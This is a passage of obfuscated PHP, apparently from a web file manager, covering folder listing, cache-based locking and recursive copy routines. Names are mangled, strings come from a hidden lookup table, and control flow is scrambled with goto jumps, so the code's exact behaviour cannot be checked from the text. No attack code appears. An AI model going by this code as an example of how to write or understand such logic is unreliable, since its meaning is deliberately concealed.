array_slice($a¡â‹ÎàÈ¦, 2)); $B„Ã‡ŸŠ[$B“éƒ¨‚¸[462]] = $B“éƒ¨‚¸[8] . LNG($B“éƒ¨‚¸[465]) . $B“éƒ¨‚¸[8] . ltrim($E‚Œ»†ÎÑô, $B“éƒ¨‚¸[8]); goto CëºÆ‰òÕç; a‹—¯Ô¯™: } protected function _listAppendPathRoot(&$C²å×äñàô, $Bãğ©¥ÓŠ²) { $d†±Æ±Ÿ‘¨ =& $_SERVER[£ü]; $eïõæÇ×™ = $d†±Æ±Ÿ‘¨[33]; if ($C²å×äñàô[$d†±Æ±Ÿ‘¨[368]] == self::TYPE_USER) { if (defined($d†±Æ±Ÿ‘¨[423]) && $C²å×äñàô[$d†±Æ±Ÿ‘¨[452]] == USER_ID) { $eïõæÇ×™ = LNG($d†±Æ±Ÿ‘¨[469]); if (!$Bãğ©¥ÓŠ²) { $C²å×äñàô[$d†±Æ±Ÿ‘¨[28]] = $eïõæÇ×™; } } else { $CŞšÇ¸°éğ = Model($d†±Æ±Ÿ‘¨[470])->getInfoSimple($C²å×äñàô[$d†±Æ±Ÿ‘¨[452]]); $eïõæÇ×™ = LNG($d†±Æ±Ÿ‘¨[471]) . $d†±Æ±Ÿ‘¨[154] . $CŞšÇ¸°éğ[$d†±Æ±Ÿ‘¨[28]] . $d†±Æ±Ÿ‘¨[472]; } } else { if ($C²å×äñàô[$d†±Æ±Ÿ‘¨[368]] == self::TYPE_GROUP) { $CŞšÇ¸°éğ = Model($d†±Æ±Ÿ‘¨[454])->getInfoSimple($C²å×äñàô[$d†±Æ±Ÿ‘¨[452]]); $eïõæÇ×™ = $CŞšÇ¸°éğ[$d†±Æ±Ÿ‘¨[28]]; } else { if ($C²å×äñàô[$d†±Æ±Ÿ‘¨[368]] == self::TYPE_SYSTEM) { $CŞšÇ¸°éğ = $this->sourceInfo($Bãğ©¥ÓŠ²[0], !0); $eïõæÇ×™ = $CŞšÇ¸°éğ[$d†±Æ±Ÿ‘¨[28]]; } } } $eïõæÇ×™ = $eïõæÇ×™ ? $d†±Æ±Ÿ‘¨[8] . $eïõæÇ×™ . $d†±Æ±Ÿ‘¨[8] : $d†±Æ±Ÿ‘¨[8]; return $eïõæÇ×™; } protected function _listAppendUser(&$F¼¼ĞâºêÙ) { $b‹æğôõì† =& $_SERVER[£ü]; $dĞÃÓÆ¨Æ = array_to_keyvalue($F¼¼ĞâºêÙ, $b‹æğôõì†[33], $b‹æğôõì†[375]); $E…øíöïÜ¨ = array_to_keyvalue($F¼¼ĞâºêÙ, $b‹æğôõì†[33], $b‹æğôõì†[376]); $f¥óë‰Øõ = array_merge($dĞÃÓÆ¨Æ, $E…øíöïÜ¨); $F¼¬·¸À‰Ğ = Model($b‹æğôõì†[473])->userListInfo($f¥óë‰Øõ); foreach ($F¼¼ĞâºêÙ as &$C×Î«ô¥Ú) { $F•À¾óï = $C×Î«ô¥Ú[$b‹æğôõì†[375]]; $C×Î«ô¥Ú[$b‹æğôõì†[375]] = $F¼¬·¸À‰Ğ[$F•À¾óï] ? $F¼¬·¸À‰Ğ[$F•À¾óï] : !1; $F•À¾óï = $C×Î«ô¥Ú[$b‹æğôõì†[376]]; $C×Î«ô¥Ú[$b‹æğôõì†[376]] = $F¼¬·¸À‰Ğ[$F•À¾óï] ? $F¼¬·¸À‰Ğ[$F•À¾óï] : !1; if (isset($C×Î«ô¥Ú[$b‹æğôõì†[413]]) && $C×Î«ô¥Ú[$b‹æğôõì†[413]][$b‹æğôõì†[474]]) { $c¶Ï“î¿Î = $GLOBALS[$b‹æğôõì†[6]][$b‹æğôõì†[84]][$b‹æğôõì†[475]]; if ($C×Î«ô¥Ú[$b‹æğôõì†[413]][$b‹æğôõì†[476]] <= time() - $c¶Ï“î¿Î) { $this->metaSet($C×Î«ô¥Ú[$b‹æğôõì†[366]], $b‹æğôõì†[474], null); $this->metaSet($C×Î«ô¥Ú[$b‹æğôõì†[366]], $b‹æğôõì†[476], null); unset($C×Î«ô¥Ú[$b‹æğôõì†[413]][$b‹æğôõì†[474]]); continue; } $CŠä¸Ú‚ø¤ = $C×Î«ô¥Ú[$b‹æğôõì†[413]][$b‹æğôõì†[474]]; $C×Î«ô¥Ú[$b‹æğôõì†[413]][$b‹æğôõì†[477]] = Model($b‹æğôõì†[473])->getInfoSimpleOuter($CŠä¸Ú‚ø¤); } } } public function parentLevelArray($c‡÷”ù»»£) { $BÇ©ˆÀ†«ë =& $_SERVER[£ü]; $c‡÷”ù»»£ = explode($BÇ©ˆÀ†«ë[47], trim($c‡÷”ù»»£, $BÇ©ˆÀ†«ë[47])); return array_remove_value($c‡÷”ù»»£, $BÇ©ˆÀ†«ë[464]); } public function listAll($d†õñáàÖÎ) { goto Eêî´¹‘ƒï; F©ß¼ƒâ¹º: $this->_listAppendAuth($a‰¿ŠÃ¬Š‡); $this->_listAppendUser($a‰¿ŠÃ¬Š‡); $this->_listAppendPath($a‰¿ŠÃ¬Š‡); goto Eö•à¶ò¿†; Eö•à¶ò¿†: $a‰¿ŠÃ¬Š‡ = array_to_keyvalue($a‰¿ŠÃ¬Š‡, $e¿’ØÁèõ™[366]); $BŒ‰æ®ê¦’ = "\57{$F½õŠ­–¼‰[$e¿’ØÁèõ™[28]]}\57"; $BŒ‰æ®ê¦’ = $BŒ‰æ®ê¦’ == $e¿’ØÁèõ™[463] ? $e¿’ØÁèõ™[8] : $BŒ‰æ®ê¦’; goto bŞ®ÚÜ„•; cŠœ‡¨©›™: $F‚™®´óğ” = $e¿’ØÁèõ™[482]; $b¼÷ŠÍ½Ä¡ = "\x4c\x45\106\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\x66\x69\x6c\145\x20\146\151\154\x65\x20\157\x6e\40\163\x6f\x75\162\x63\x65\56\146\x69\x6c\145\x49\x44\x20\75\x20\x66\151\x6c\145\56\146\x69\x6c\x65\x49\104"; $a‰¿ŠÃ¬Š‡ = $this->alias($e¿’ØÁèõ™[483])->field($F‚™®´óğ”)->where($EÏ¼—˜§ Ô)->join($b¼÷ŠÍ½Ä¡)->select(); goto F©ß¼ƒâ¹º; bŞ®ÚÜ„•: $FÄÎ˜Õ–Í³ = array(); foreach ($a‰¿ŠÃ¬Š‡ as $dæª¬“ãŸ => $bÃ„Œ¥³ÏÚ) { goto b®šŸ“ƒ³‹; b®šŸ“ƒ³‹: $c‰Á¯à´£ = $this->parentLevelArray($bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[455]]); array_shift($c‰Á¯à´£); $A©¬ïŠè‰½ = $BŒ‰æ®ê¦’; goto dÕÃÍ©‚§; FïÔ‘¿Û”: $A©¬ïŠè‰½ = str_replace($e¿’ØÁèõ™[463], $e¿’ØÁèõ™[8], $A©¬ïŠè‰½); $A©¬ïŠè‰½ = str_replace($e¿’ØÁèõ™[463], $e¿’ØÁèõ™[8], $A©¬ïŠè‰½); $C©ªˆ¯‚™ = array($e¿’ØÁèõ™[384] => str_replace($e¿’ØÁèõ™[463], $e¿’ØÁèõ™[8], $A©¬ïŠè‰½), $e¿’ØÁèõ™[484] => intval($bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[367]]), $e¿’ØÁèõ™[388] => $this->pathInfoFilter($bÃ„Œ¥³ÏÚ, !0)); goto d‡ˆñáìÕè; dÕÃÍ©‚§: for ($Aô¿•˜Œ‘‡ = 0; $Aô¿•˜Œ‘‡ < count($c‰Á¯à´£); $Aô¿•˜Œ‘‡++) { $A©¬ïŠè‰½ .= $a‰¿ŠÃ¬Š‡[$c‰Á¯à´£[$Aô¿•˜Œ‘‡]][$e¿’ØÁèõ™[28]] . $e¿’ØÁèõ™[8]; } $A©¬ïŠè‰½ .= $bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[28]]; if ($bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[367]]) { $A©¬ïŠè‰½ .= $e¿’ØÁèõ™[8]; } goto FïÔ‘¿Û”; d‡ˆñáìÕè: if (!$bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[367]]) { $C©ªˆ¯‚™[$e¿’ØÁèõ™[415]] = $bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[415]]; $C©ªˆ¯‚™[$e¿’ØÁèõ™[485]] = $bÃ„Œ¥³ÏÚ[$e¿’ØÁèõ™[75]]; } $FÄÎ˜Õ–Í³[] = $C©ªˆ¯‚™; goto eŠ¼òÂ‡; eŠ¼òÂ‡: } return $FÄÎ˜Õ–Í³; goto Bçä‚—é†¸; Eêî´¹‘ƒï: $e¿’ØÁèõ™ =& $_SERVER[£ü]; $F½õŠ­–¼‰ = $this->sourceInfo($d†õñáàÖÎ); $EÏ¼—˜§ Ô = array($e¿’ØÁèõ™[478] => array($e¿’ØÁèõ™[479], $F½õŠ­–¼‰[$e¿’ØÁèõ™[455]] . $d†õñáàÖÎ . $e¿’ØÁèõ™[480]), $e¿’ØÁèõ™[481] => 0); goto cŠœ‡¨©›™; Bçä‚—é†¸: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($EŸäó¨¡¹’) { goto fƒÀ·¼ïÌ; eºôÄ¸ÈëŞ: $this->_lockEvent($EŸäó¨¡¹’, array($D‹Ğàñˆ‘Ğ[489], $D‹Ğàñˆ‘Ğ[490]), $F„Ö…İŒÄ); $this->_lockCheckEnd($D‹Ğàñˆ‘Ğ[486], $EŸäó¨¡¹’); goto DÄåˆ´ç»Õ; aÈÇ†îñ¼: $F„Ö…İŒÄ = 1; $this->_lockEvent($EŸäó¨¡¹’, array($D‹Ğàñˆ‘Ğ[487], $D‹Ğàñˆ‘Ğ[488]), $F„Ö…İŒÄ); $this->_lockParent($EŸäó¨¡¹’, array($D‹Ğàñˆ‘Ğ[488]), $F„Ö…İŒÄ); goto eºôÄ¸ÈëŞ; fƒÀ·¼ïÌ: $D‹Ğàñˆ‘Ğ =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($D‹Ğàñˆ‘Ğ[486], $EŸäó¨¡¹’); goto aÈÇ†îñ¼; DÄåˆ´ç»Õ: } public function lockCopyEnd($C‡ƒ®İÇåç) { $C•‚÷›ÎÔİ =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $AŞ¢¦¬Â = 0; $this->_lockEvent($C‡ƒ®İÇåç, array($C•‚÷›ÎÔİ[487], $C•‚÷›ÎÔİ[488]), $AŞ¢¦¬Â); $this->_lockParent($C‡ƒ®İÇåç, array($C•‚÷›ÎÔİ[488]), $AŞ¢¦¬Â); $this->_lockEvent($C‡ƒ®İÇåç, array($C•‚÷›ÎÔİ[489], $C•‚÷›ÎÔİ[490]), $AŞ¢¦¬Â); } public function lockWriteStart($FÍöÃ›¼­‹, $Fš§…â“÷‘ = '') { goto d„ëĞ¼äÄ; dÚÈô¬™ß´: $FºÙ•­ŞŠ = 1; $this->_lockKey($bÇ³…Ï¸ô[491] . $FÍöÃ›¼­‹ . $bÇ³…Ï¸ô[93] . $Fš§…â“÷‘, $FºÙ•­ŞŠ); $this->_lockEvent($FÍöÃ›¼­‹, array($bÇ³…Ï¸ô[486], $bÇ³…Ï¸ô[488]), $FºÙ•­ŞŠ); goto Eã¡»î²ß¦; Eã¡»î²ß¦: $this->_lockParent($FÍöÃ›¼­‹, array($bÇ³…Ï¸ô[486], $bÇ³…Ï¸ô[488]), $FºÙ•­ŞŠ); $this->_lockCheckEnd($bÇ³…Ï¸ô[487], $FÍöÃ›¼­‹); goto dìÚí¥²ÕÉ; d„ëĞ¼äÄ: $bÇ³…Ï¸ô =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÇ³…Ï¸ô[487], $FÍöÃ›¼­‹); goto dÚÈô¬™ß´; dìÚí¥²ÕÉ: } public function lockWriteEnd($Fµ”®™â°, $Cô¡×ìÕŒ¾ = '') { $A¶¶šÁæ–Ê =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $BÚù”ùøÒŸ = 0; $this->_lockKey($A¶¶šÁæ–Ê[491] . $Fµ”®™â° . $A¶¶šÁæ–Ê[93] . $Cô¡×ìÕŒ¾, $BÚù”ùøÒŸ); $this->_lockEvent($Fµ”®™â°, array($A¶¶šÁæ–Ê[486], $A¶¶šÁæ–Ê[488]), $BÚù”ùøÒŸ); $this->_lockParent($Fµ”®™â°, array($A¶¶šÁæ–Ê[486], $A¶¶šÁæ–Ê[488]), $BÚù”ùøÒŸ); } public function lockMoveStart($a¿ÖƒËµ‚) { goto c´ŒÚ¤˜õÑ; c´ŒÚ¤˜õÑ: $Bš†”ø²ˆÕ =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($Bš†”ø²ˆÕ[488], $a¿ÖƒËµ‚); goto bÆÓ¨åÏ×§; bÆÓ¨åÏ×§: $dê¦Ÿöùª = 1; $this->_lockKey($Bš†”ø²ˆÕ[492] . $a¿ÖƒËµ‚, $dê¦Ÿöùª); $this->_lockEvent($a¿ÖƒËµ‚, array($Bš†”ø²ˆÕ[486], $Bš†”ø²ˆÕ[487]), $dê¦Ÿöùª); goto fõÌ­ÉÏöì; fõÌ­ÉÏöì: $this->_lockParent($a¿ÖƒËµ‚, array($Bš†”ø²ˆÕ[486], $Bš†”ø²ˆÕ[488]), $dê¦Ÿöùª); $this->_lockEvent($a¿ÖƒËµ‚, array($Bš†”ø²ˆÕ[493], $Bš†”ø²ˆÕ[489], $Bš†”ø²ˆÕ[490]), $dê¦Ÿöùª); $this->_lockCheckEnd($Bš†”ø²ˆÕ[488], $a¿ÖƒËµ‚); goto c§ó¯„ù•´; c§ó¯„ù•´: } public function lockMoveEnd($AŸ’°×‡­Ê) { goto c¥«åŞÅ°¬; c¥«åŞÅ°¬: $dˆï¹­Ø„© =& $_SERVER[£ü]; if (!$this->allowLock()) { return; } $C„¨îÖÌã× = 0; goto B˜—ÙïÉï›; B˜—ÙïÉï›: $this->_lockKey($dˆï¹­Ø„©[492] . $AŸ’°×‡­Ê, $C„¨îÖÌã×); $this->_lockEvent($AŸ’°×‡­Ê, array($dˆï¹­Ø„©[486], $dˆï¹­Ø„©[487]), $C„¨îÖÌã×); $this->_lockParent($AŸ’°×‡­Ê, array($dˆï¹­Ø„©[486], $dˆï¹­Ø„©[488]), $C„¨îÖÌã×); goto FÜìáµŒ¤; FÜìáµŒ¤: $this->_lockEvent($AŸ’°×‡­Ê, array($dˆï¹­Ø„©[493], $dˆï¹­Ø„©[489], $dˆï¹­Ø„©[490]), $C„¨îÖÌã×); goto c¥ŸÌÙôäï; c¥ŸÌÙôäï: } private function _lockCheck($bİ¡İôô¡õ, $aÓÒøàèµÔ) { goto dŞÊ¡¥öÓœ; dæ÷çÅô©ï: $this->_lockTimeStart[$B¨Ÿ´²…ÛÈ] = timeFloat(); if (!is_array($d¼ØÎŒ†½)) { return; } $CË³Ï˜¥È¢ = LNG($a‘¿©¸ß£´[494]); goto Fäå¡; Fäå¡: CacheLock::setErrorMsg($a‘¿©¸ß£´[154] . htmlspecialchars($d¼ØÎŒ†½[$a‘¿©¸ß£´[28]]) . $a‘¿©¸ß£´[472] . $CË³Ï˜¥È¢); $this->_lockKey($B¨Ÿ´²…ÛÈ, 1); $this->_lockKey($B¨Ÿ´²…ÛÈ, 0); goto d÷ğéÙÏ¨Æ; d÷ğéÙÏ¨Æ: $fö›œ²æ‹ë = array_reverse($this->parentLevelArray($d¼ØÎŒ†½[$a‘¿©¸ß£´[455]])); foreach ($fö›œ²æ‹ë as $C ²¹¯ğó) { $B¨Ÿ´²…ÛÈ = $bİ¡İôô¡õ . $a‘¿©¸ß£´[495] . $C ²¹¯ğó; if (CacheLock::lockGet($a‘¿©¸ß£´[496] . $B¨Ÿ´²…ÛÈ)) { $d¼ØÎŒ†½ = $this->sourceInfo($C ²¹¯ğó); CacheLock::setErrorMsg($a‘¿©¸ß£´[154] . htmlspecialchars($d¼ØÎŒ†½[$a‘¿©¸ß£´[28]]) . $a‘¿©¸ß£´[472] . $CË³Ï˜¥È¢); $this->_lockKey($B¨Ÿ´²…ÛÈ, 1); $this->_lockKey($B¨Ÿ´²…ÛÈ, 0); } } goto B™Şô²„†ù; dŞÊ¡¥öÓœ: $a‘¿©¸ß£´ =& $_SERVER[£ü]; $d¼ØÎŒ†½ = $this->sourceInfo($aÓÒøàèµÔ); $B¨Ÿ´²…ÛÈ = $bİ¡İôô¡õ . $a‘¿©¸ß£´[93] . $aÓÒøàèµÔ; goto dæ÷çÅô©ï; B™Şô²„†ù: } private function _lockCheckEnd($dÉ¤Ê»Íİ¶, $A’öå¢¯»¾) { goto a´êšìõ”; aŞ¬ó¹ÊĞê: if (!isset($this->_lockTimeStart[$AÓ«Ÿâ‹ƒù])) { return; } $c»È¨•›¡è = timeFloat() - $this->_lockTimeStart[$AÓ«Ÿâ‹ƒù]; unset($this->_lockTimeStart[$AÓ«Ÿâ‹ƒù]); goto CøŒ¿İ”óù; CøŒ¿İ”óù: if ($c»È¨•›¡è > 0.5) { unset(self::$cacheSourceInfo[$DÜ½½ê£·[406] . $A’öå¢¯»¾]); } $b¥í­»Éß¼ = $this->sourceInfo($A’öå¢¯»¾); if (!$b¥í­»Éß¼) { show_json(LNG($DÜ½½ê£·[102]), !1); } goto Cİ»šåƒ¬½; a´êšìõ”: $DÜ½½ê£· =& $_SERVER[£ü]; $AÓ«Ÿâ‹ƒù = $dÉ¤Ê»Íİ¶ . $DÜ½½ê£·[93] . $A’öå¢¯»¾; CacheLock::setErrorMsg($DÜ½½ê£·[358]); goto aŞ¬ó¹ÊĞê; Cİ»šåƒ¬½: } private function _lockParent($EÔ»½¨®Ô, $Bá‡Á¼Û©ğ, $CíºÔÑ–Ñ) { if (!$this->autoLockSet) { return; } $a¸”“®«¼‚ = $this->sourceInfo($EÔ»½¨®Ô); if (!is_array($a¸”“®«¼‚)) { return; } $b³ÌÆÌŒ¹ = array_reverse($this->parentLevelArray($a¸”“®«¼‚[$_SERVER[£ü][455]])); foreach ($b³ÌÆÌŒ¹ as $fâÂ˜áù‰) { $this->_lockEvent($fâÂ˜áù‰, $Bá‡Á¼Û©ğ, $CíºÔÑ–Ñ); } } private function _lockEvent($D±ßºìÁ´, $b‰æ©¾àÃ˜, $Aååò‹öàµ) { $ešàóÂ·Å =& $_SERVER[£ü]; if (!$this->autoLockSet) { return; } foreach ($b‰æ©¾àÃ˜ as $b×ñŸñó½¤) { $bî“Õá¹Ê¦ = $b×ñŸñó½¤ . $ešàóÂ·Å[93] . $D±ßºìÁ´; if ($Aååò‹öàµ && CacheLock::lockGet($ešàóÂ·Å[496] . $bî“Õá¹Ê¦)) { continue; } $this->_lockKey($bî“Õá¹Ê¦, $Aååò‹öàµ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($B¼¿–³öºÕ, $Cä˜Ø¥Æ‡Ö = 1) { $aÍËÌñÒ’ = $_SERVER[£ü][496] . md5($B¼¿–³öºÕ); if ($Cä˜Ø¥Æ‡Ö) { if (isset(self::$_lockItemArr[$aÍËÌñÒ’])) { return; } self::$_lockItemArr[$aÍËÌñÒ’] = 1; CacheLock::lock($aÍËÌñÒ’, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$aÍËÌñÒ’])) { return; } unset(self::$_lockItemArr[$aÍËÌñÒ’]); CacheLock::unlock($aÍËÌñÒ’); } } public function isParentOf($D‹Ç„õõ¦, $b—»¤‡‰Ú±) { goto cìãË„ãº¾; aŠ“¡ÖÚó: $BÄøõ¡ïØ = $e˜ñ‹àÆÚ¯[$F¶¬ƒõê…ñ[455]] . $e˜ñ‹àÆÚ¯[$F¶¬ƒõê…ñ[366]] . $F¶¬ƒõê…ñ[47]; $CºÍ£ÒãÚ‚ = $f÷¯¨îŸÄÄ[$F¶¬ƒõê…ñ[455]] . $f÷¯¨îŸÄÄ[$F¶¬ƒõê…ñ[366]] . $F¶¬ƒõê…ñ[47]; $CÜƒµ©Ş”ò = strpos($CºÍ£ÒãÚ‚, $BÄøõ¡ïØ) === 0; goto cÆ¨ç÷øˆ; cìãË„ãº¾: $F¶¬ƒõê…ñ =& $_SERVER[£ü]; $e˜ñ‹àÆÚ¯ = $this->sourceInfo($D‹Ç„õõ¦); $f÷¯¨îŸÄÄ = $this->sourceInfo($b—»¤‡‰Ú±); goto aŠ“¡ÖÚó; cÆ¨ç÷øˆ: return $CÜƒµ©Ş”ò; goto CßÂÆšˆ½š; CßÂÆšˆ½š: } private $targetIsDelete = 0; public function copy($d»¾ğîğ‰, $AÈŠ‚ƒÎ³µ, $fˆÎ´Àçù = REPEAT_REPLACE, $EÎìŞ»¨¶å = '') { goto e§õôôòãº; b²¶š’„Š: $this->_childrenListClear(); $this->lockCopyEnd($d»¾ğîğ‰); $this->lockWriteEnd($AÈŠ‚ƒÎ³µ, $B°ßµóÏœ¯); goto Fµµ•…×½Ç; Fµµ•…×½Ç: if ($d‰ƒ²”˜À [$BÇ·ƒ§óÕ‘[367]] == $BÇ·ƒ§óÕ‘[83] && $e§·Æóƒ‰¯ == $d¼ÔÏØ¹¾â) { $this->folderSizeResetChildren($e§·Æóƒ‰¯); } Model($BÇ·ƒ§óÕ‘[500])->addAll($Cµ¥Ï…Ó[$BÇ·ƒ§óÕ‘[498]], array(), !0); if ($e§·Æóƒ‰¯ != $d¼ÔÏØ¹¾â || $d‰ƒ²”˜À [$BÇ·ƒ§óÕ‘[367]] == $BÇ·ƒ§óÕ‘[83]) { Model($BÇ·ƒ§óÕ‘[501])->eventCopy($d¼ÔÏØ¹¾â); } goto f¨¢‚•¶Ã; DÙôÒ¶ù¦“: if (!$d‰ƒ²”˜À  || !$D…¥Ï–Üµ‹ || $D…¥Ï–Üµ‹[$BÇ·ƒ§óÕ‘[367]] != $BÇ·ƒ§óÕ‘[83]) { return !1; } if ($this->isParentOf($d»¾ğîğ‰, $AÈŠ‚ƒÎ³µ)) { return !1; } $B°ßµóÏœ¯ = $EÎìŞ»¨¶å ? $EÎìŞ»¨¶å : $d‰ƒ²”˜À [$BÇ·ƒ§óÕ‘[28]]; goto a¡èæÃ‹Ì›; f“ˆ¿®²ÊË: $this->targetIsDelete = intval($d‰ƒ²”˜À [$BÇ·ƒ§óÕ‘[393]]); $e§·Æóƒ‰¯ = $this->fileNameExistCache($AÈŠ‚ƒÎ³µ, $d‰ƒ²”˜À [$BÇ·ƒ§óÕ‘[28]]); $d¼ÔÏØ¹¾â = $this->_copy($d»¾ğîğ‰, $AÈŠ‚ƒÎ³µ, $fˆÎ´Àçù, $Cµ¥Ï…Ó, !0, $EÎìŞ»¨¶å); goto b²¶š’„Š; fÖâ£‰×æ·: $this->updateModifyTime($AÈŠ‚ƒÎ³µ); return $d¼ÔÏØ¹¾â; goto e¬Éš½ï; a¡èæÃ‹Ì›: $this->lockCopyStart($d»¾ğîğ‰); $this->lockWriteStart($AÈŠ‚ƒÎ³µ, $B°ßµóÏœ¯); $Cµ¥Ï…Ó = array($BÇ·ƒ§óÕ‘[497] => array(), $BÇ·ƒ§óÕ‘[498] => array(), $BÇ·ƒ§óÕ‘[499] => array()); goto f“ˆ¿®²ÊË; f¨¢‚•¶Ã: $this->saveAll($Cµ¥Ï…Ó[$BÇ·ƒ§óÕ‘[499]]); Model($BÇ·ƒ§óÕ‘[164])->linkAdd($Cµ¥Ï…Ó[$BÇ·ƒ§óÕ‘[497]]); $this->folderSizeReset($AÈŠ‚ƒÎ³µ); goto fÖâ£‰×æ·; e§õôôòãº: $BÇ·ƒ§óÕ‘ =& $_SERVER[£ü]; $d‰ƒ²”˜À  = $this->sourceInfo($d»¾ğîğ‰); $D…¥Ï–Üµ‹ = $this->sourceInfo($AÈŠ‚ƒÎ³µ); goto DÙôÒ¶ù¦“; e¬Éš½ï: } private function _copy($a¯ÇÙæÉ°, $A“îåî„‘•, $E›ã‰®‡ï, &$C…¯ãœ‹…£, $fæ‹Ğ«›ê, $cšÙßîõ”® = '') { goto Bˆ×ï¨½é—; aÕê¶Š¼§±: $b¿õİäî°ç = $cšÙßîõ”® ? $cšÙßîõ”® : $Eè¶‚ŸƒÂ¾[$bÂ‚‘Ş×Åâ[28]]; $EÜ×ÄÔÈ = $this->fileNameExistCache($A“îåî„‘•, $b¿õİäî°ç); if ($fæ‹Ğ«›ê) { $this->_childrenAllMake($a¯ÇÙæÉ°); if ($AÌ á‡­âÔ && $EÜ×ÄÔÈ) { $this->_childrenAllMake($EÜ×ÄÔÈ); } } goto eçÈæˆãŠ; eçÈæˆãŠ: if (!$EÜ×ÄÔÈ) { return $this->_copyCreate($a¯ÇÙæÉ°, $A“îåî„‘•, $b¿õİäî°ç, $C…¯ãœ‹…£); } $BƒÎéˆŒÇ™ = $EÜ×ÄÔÈ; if ($AÌ á‡­âÔ) { if ($E›ã‰®‡ï == REPEAT_RENAME_FOLDER) { $b¿õİäî°ç = $this->fileNameAutoCache($A“îåî„‘•, $b¿õİäî°ç, $E›ã‰®‡ï, $AÌ á‡­âÔ); $BƒÎéˆŒÇ™ = $this->_copyCreate($a¯ÇÙæÉ°, $A“îåî„‘•, $b¿õİäî°ç, $C…¯ãœ‹…£); } else { $cß·…¦š¨ = $this->_childrenList($a¯ÇÙæÉ°); foreach ($cß·…¦š¨ as $e•ª‡­…Œ÷) { $this->_copy($e•ª‡­…Œ÷[$bÂ‚‘Ş×Åâ[366]], $EÜ×ÄÔÈ, $E›ã‰®‡ï, $C…¯ãœ‹…£, !1); } } } else { if ($E›ã‰®‡ï == REPEAT_RENAME || $E›ã‰®‡ï == REPEAT_RENAME_FOLDER) { $b¿õİäî°ç = $this->fileNameAutoCache($A“îåî„‘•, $b¿õİäî°ç, $E›ã‰®‡ï, $AÌ á‡­âÔ); $BƒÎéˆŒÇ™ = $this->_copyCreate($a¯ÇÙæÉ°, $A“îåî„‘•, $b¿õİäî°ç, $C…¯ãœ‹…£); } else { if ($E›ã‰®‡ï == REPEAT_REPLACE) { $FÂ™Ó‚®› = $this->sourceInfoCache($EÜ×ÄÔÈ); $C’º²’ºšŠ = $this->fileHistory($FÂ™Ó‚®›, $Eè¶‚ŸƒÂ¾[$bÂ‚‘Ş×Åâ[415]], $Eè¶‚ŸƒÂ¾[$bÂ‚‘Ş×Åâ[77]]); if ($C’º²’ºšŠ) { $C…¯ãœ‹…£[$bÂ‚‘Ş×Åâ[497]][] = $Eè¶‚ŸƒÂ¾[$bÂ‚‘Ş×Åâ[415]]; } } else { if ($E›ã‰®‡ï == REPEAT_SKIP) { } } } Hook::trigger($bÂ‚‘Ş×Åâ[502], array($bÂ‚‘Ş×Åâ[503], $Eè¶‚ŸƒÂ¾, 0)); } goto Dó§¯œØ¡„; Dó§¯œØ¡„: return $BƒÎéˆŒÇ™; goto FŸµè†Ñˆ›; Bˆ×ï¨½é—: $bÂ‚‘Ş×Åâ =& $_SERVER[£ü]; $Eè¶‚ŸƒÂ¾ = $this->sourceInfoCache($a¯ÇÙæÉ°); $AÌ á‡­âÔ = $Eè¶‚ŸƒÂ¾[$bÂ‚‘Ş×Åâ[367]] == $bÂ‚‘Ş×Åâ[83]; goto aÕê¶Š¼§±; FŸµè†Ñˆ›: } private function _copyCreate($e‡¸†¼­, $cÏæ–‘æ¼®, $a §ó§á„, &$Bá¯Ê··´Ü) { goto cÏ¾„ÑÕğñ; b÷°®ïï‚‰: $dêË‘¸ñÆâ = $this->add($F¦ˆé‹ñ„‡); $b™ğ —÷ø = array($BÂ¼—æ¥³‘[366] => $dêË‘¸ñÆâ, $BÂ¼—æ¥³‘[28] => $a §ó§á„); $this->_copyApplyMeta($b™ğ —÷ø, $Bá¯Ê··´Ü); goto Dù÷Ì¶Œ¦; e¤™Ö¼íÕ: foreach ($C¥á¡íÂ¦ as $C·Åï‰Ÿ¨¬) { $E†Ä«‘å¿˜ = $C·Åï‰Ÿ¨¬[$BÂ¼—æ¥³‘[366]]; $A»ˆĞÇëöã = $this->_childrenMatch($BóêÙ†µòŠ, $C·Åï‰Ÿ¨¬, $eœŠŠÚ·…†); $bÖåÀÏ×Œ[] = array($BÂ¼—æ¥³‘[366], $E†Ä«‘å¿˜, $BÂ¼—æ¥³‘[457], $A»ˆĞÇëöã[$BÂ¼—æ¥³‘[457]]); $a½ï«¯…ùÇ[] = array($BÂ¼—æ¥³‘[366], $E†Ä«‘å¿˜, $BÂ¼—æ¥³‘[455], $A»ˆĞÇëöã[$BÂ¼—æ¥³‘[455]]); $this->_copyApplyMeta($C·Åï‰Ÿ¨¬, $Bá¯Ê··´Ü); if ($C·Åï‰Ÿ¨¬[$BÂ¼—æ¥³‘[367]] != $BÂ¼—æ¥³‘[83]) { $Bá¯Ê··´Ü[$BÂ¼—æ¥³‘[497]][] = $C·Åï‰Ÿ¨¬[$BÂ¼—æ¥³‘[415]]; } } $this->chunkEventSet($BÂ¼—æ¥³‘[509], array($BÂ¼—æ¥³‘[510], $F¦ˆé‹ñ„‡, $e¸ÈÎğî)); $this->saveAll($bÖåÀÏ×Œ); goto bÒ¾ŒÊ¤˜; cÏ¾„ÑÕğñ: $BÂ¼—æ¥³‘ =& $_SERVER[£ü]; $EÄ×­ÀÕõ = $this->sourceInfoCache($e‡¸†¼­); $aáÊ´»ä« = $this->sourceInfoCache($cÏæ–‘æ¼®); goto BÜ£Ì¡à¾â; Dù÷Ì¶Œ¦: if ($EÄ×­ÀÕõ[$BÂ¼—æ¥³‘[367]] != $BÂ¼—æ¥³‘[83]) { $Bá¯Ê··´Ü[$BÂ¼—æ¥³‘[497]][] = $EÄ×­ÀÕõ[$BÂ¼—æ¥³‘[415]]; return $dêË‘¸ñÆâ; } $Fç„²—ÛÀ = array(); 